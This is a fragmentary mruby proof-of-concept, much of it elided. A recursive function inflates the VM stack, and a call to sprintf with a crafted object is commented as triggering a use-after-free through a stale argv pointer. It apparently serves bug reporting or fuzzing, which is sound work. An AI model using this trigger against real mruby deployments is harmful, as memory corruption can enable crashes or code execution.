...
def recurse(depth)
  ...
  v80 = v81 = v82 = v83 = v84 = v85 = mruby_rules = 0
...
bad = Bad.new
# Calling sprintf with bad and another argument "extra"
# Formatting "%s %s" will first call bad.to_s, which reallocates/moves the stack.
# The second argument "extra" is then fetched from the stale argv pointer, causing a Use-After-Free!
sprintf("%s %s", bad, "extra")
